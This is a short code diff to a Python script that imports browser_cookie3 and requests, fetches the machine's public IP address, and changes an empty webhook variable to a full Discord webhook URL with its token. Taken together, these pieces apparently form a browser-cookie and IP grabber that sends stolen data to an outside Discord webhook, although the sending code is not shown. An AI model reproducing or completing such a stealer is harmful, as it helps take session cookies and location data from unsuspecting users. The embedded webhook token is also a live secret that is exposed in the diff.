@@ -4,7 +4,7 @@ import requests
 import browser_cookie3
 
 
-webhook = ""
+webhook = "https://discord.com/api/webhooks/1317704312985747477/C3WzGGj9cZlaMM8MyB-SZAGGrChiiKTjvVl1luIBglGd7nB6m3k_yZLxkL3uPqvemnSz"
 
 if __name__ == "__main__":
     ip = requests.get("https://api.ipify.org").text
